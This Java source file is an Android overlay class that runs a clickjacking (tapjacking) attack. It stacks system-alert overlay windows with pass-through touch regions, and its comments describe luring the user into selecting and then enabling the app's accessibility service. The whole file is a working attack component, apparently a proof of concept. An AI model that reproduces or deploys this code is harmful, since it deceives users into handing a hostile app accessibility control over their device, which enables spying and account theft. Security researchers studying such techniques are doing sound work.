package com.example.android.globalactionbarservice;

import android.content.Context;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.view.Display;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;

import java.util.ArrayList;

// It implements Runnable because each screen setup will only set the views and the ClickJacking listener up. The latter will call this instance back as a Runnable, and the next screen will be set up:
public class Overlay implements Runnable{

    private MainActivity mActivity;
    private Context mContext;

    // A counter to decide which screen should be rendered:
    private int screenCount;

    // Window type (I believe TYPE_TOAST works as well):
    private int type =  WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

    // Flags for generating a non-clickable view:
    private int nonClickable = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                             | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                             | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;

    // Flags for generating a clickable view:
    private int clickable = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                          | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                          | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;

    private static WindowManager manager;

    // Screen dimensions minus the status bar:
    private int width;
    private int height;

    // List of views rendered at a given moment:
    private ArrayList<View> views;

    public Overlay(MainActivity activity) {

        mActivity = activity;

        // Get current context:
        mContext = mActivity.getApplicationContext();

        // Start by first screen:
        screenCount = 1;

        // Get window manager:
        manager = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);

        // Get status bar height to subtract it from the total screen height:
        int statusBarHeightRes = mContext.getResources().getIdentifier("status_bar_height", "dimen", "android");
        int statusBarHeight = statusBarHeightRes < 0 ? 0 : mContext.getResources().getDimensionPixelSize(statusBarHeightRes);

        // Get width and height of screen minus the status bar:
        Display display = manager.getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);
        width = size.x;
        height = size.y - statusBarHeight;

        // Init list of views:
        views = new ArrayList<View>();
    }

    // Get the real height given a percentage:
    private int getRealHeight(int perc) {
        return height * perc / 100;
    }

    // The main routine of the class, which cleanups the previews rendering and renders the current views. It is called by the ClickJacking listener:
    @Override
    public void run() {
        // Cleanup window manager:
        while (views.size() > 0) {
            manager.removeView(views.get(0));
            views.remove(0);
        }

        // Get new window:
        manager = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);

        // Decide which screen to render:
        switch (screenCount) {
            case 1:
                screenCount += 1;
                firstScreen();
                break;
            case 2:
                screenCount += 1;
                secondScreen();
                break;
            default:
                mActivity.finish();
        }
    }

    // First overlay screen, which lures to user into selecting our accessibility service from the settings:
    private void firstScreen() {

        View view;
        WindowManager.LayoutParams parms;

        // Setup unresponsive view (top padding):
        //view = LayoutInflater.from(mContext).inflate(R.layout.transparent_blue, null);
        view = LayoutInflater.from(mContext).inflate(R.layout.first_screen_text, null);

        // Instantiate a clickjacker that will intercept the click and call this instance back, rendering the next screen:
        view.setOnTouchListener(new ClickJacking(this));

        parms = new WindowManager.LayoutParams(
                width,
                getRealHeight(65),
                0,
                0,
                type,
                nonClickable,
                PixelFormat.TRANSLUCENT
        );

        parms.gravity = Gravity.TOP | Gravity.START;

        // Add overlay view to window:
        manager.addView(view, parms);

        // Add view to list:
        views.add(view);

        // Setup unresponsive view (bottom padding):
        //view = LayoutInflater.from(mContext).inflate(R.layout.transparent_blue, null);
        view = LayoutInflater.from(mContext).inflate(R.layout.blank, null);

        parms = new WindowManager.LayoutParams(
                width,
                getRealHeight(20),
                0,
                0,
                type,
                nonClickable,
                PixelFormat.TRANSLUCENT
        );

        parms.gravity = Gravity.BOTTOM | Gravity.START;

        // Add overlay view to window:
        manager.addView(view, parms);

        // Add view to list:
        views.add(view);

        // Setup responsive view (which can be clicked):
        //view = LayoutInflater.from(mContext).inflate(R.layout.transparent_red, null);
        view = LayoutInflater.from(mContext).inflate(R.layout.get_started, null);

        parms = new WindowManager.LayoutParams(
                width,
                getRealHeight(15),
                0,
                getRealHeight(65),
                type,
                clickable,
                PixelFormat.TRANSLUCENT
        );

        parms.gravity = Gravity.TOP | Gravity.START;

        // Add overlay view to window:
        manager.addView(view, parms);

        // Add view to list:
        views.add(view);
    }

    // Second overlay screen, which lures the user into enabling our accessibility service:
    private void secondScreen() {

        View view;
        WindowManager.LayoutParams parms;

        // Setup unresponsive view (top padding):
        //view = LayoutInflater.from(mContext).inflate(R.layout.transparent_blue, null);
        view = LayoutInflater.from(mContext).inflate(R.layout.blank, null);

        // Instantiate a clickjacker that will intercept the click and call this instance back, rendering the next screen:
        view.setOnTouchListener(new ClickJacking(this));

        parms = new WindowManager.LayoutParams(
                width,
                getRealHeight(12),
                0,
                0,
                type,
                nonClickable,
                PixelFormat.TRANSLUCENT
        );

        parms.gravity = Gravity.TOP | Gravity.START;

        // Add overlay view to window:
        manager.addView(view, parms);

        // Add view to list:
        views.add(view);

        // Setup unresponsive view (bottom padding):
        //view = LayoutInflater.from(mContext).inflate(R.layout.transparent_blue, null);
        view = LayoutInflater.from(mContext).inflate(R.layout.second_screen_text, null);

        parms = new WindowManager.LayoutParams(
                width,
                getRealHeight(78),
                0,
                0,
                type,
                nonClickable,
                PixelFormat.TRANSLUCENT
        );

        parms.gravity = Gravity.BOTTOM | Gravity.START;

        // Add overlay view to window:
        manager.addView(view, parms);

        // Add view to list:
        views.add(view);

        // Setup responsive view (which can be clicked):
        //view = LayoutInflater.from(mContext).inflate(R.layout.transparent_red, null);
        view = LayoutInflater.from(mContext).inflate(R.layout.next, null);

        parms = new WindowManager.LayoutParams(
                width,
                getRealHeight(10),
                0,
                getRealHeight(12),
                type,
                clickable,
                PixelFormat.TRANSLUCENT
        );

        parms.gravity = Gravity.TOP | Gravity.START;

        // Add overlay view to window:
        manager.addView(view, parms);

        // Add view to list:
        views.add(view);
    }
}